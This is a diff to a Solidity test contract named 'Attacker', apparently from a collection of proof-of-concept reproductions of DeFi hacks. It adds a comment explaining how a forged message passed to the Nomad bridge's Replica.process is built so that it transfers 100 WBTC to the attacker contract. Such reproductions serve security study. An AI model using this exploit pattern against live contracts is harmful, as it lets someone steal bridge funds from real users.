@@ -52,6 +52,27 @@ contract Attacker is Test {
         bytes memory msgP2 = hex"00000000000000000000000000000000000000000000000000000002540be400e6e85ded018819209cfb948d074cb65de145734b5b0852e4a5db25cac2b8c39a";
         bytes memory _message = bytes.concat(msgP1, recvAddr, msgP2);
 
+        // This is _message data structure :
+        /*
+            bytes memory chainId = "beam";   // hex(6265616d) == dec(1650811245), Ref: https://docs.nomad.xyz/developers/environments/domain-chain-ids
+            bytes memory sender = hex"D3dfD3eDe74E0DCEBC1AA685e151332857efCe2d";
+            bytes memory nonce = hex"13d6";         // == dec"5078"
+            bytes memory localDomain = hex"657468"; // == str"eth"
+            bytes memory recipientAddress = hex"88A69B4E698A4B090DF6CF5Bd7B2D47325Ad30A3";    // BridgeRouter address. this will callback BridgeRouter.handle(_message)
+             ------------ __message that call BridgeRouter.handle(__message) ------------
+            uint32 _domain = 657468;    // == str("eth")
+            bytes32 _id = abi.encodePacked(address(WBTC));
+            bytes32 _to = abi.encodePacked(address(this));
+            uint256 _amnt = 100 * 1e8; // 100 WBTC
+            bytes32 _detailsHash = keccak256(abi.encodePacked(bytes("Wrapped BTC").length, "Wrapped BTC", bytes("WBTC").length, "WBTC", uint8(8)));        
+            bytes29 _tokenId = BridgeMessage.formatTokenId(_domain, _id);
+            bytes29 _action = BridgeMessage.formatTransfer(_to, _amnt, _detailsHash);
+            bytes memory __message = BridgeMessage.formatMessage(_tokenId, _action);
+            -----------------------------------------------------------------------------
+            bytes memory _message = bytes.concat(chainId, sender, nonce, localDomain, recipientAddress, __message);
+        */
+
+
         bool suc = Replica.process(_message);
         require(suc, "Exploit failed");
 
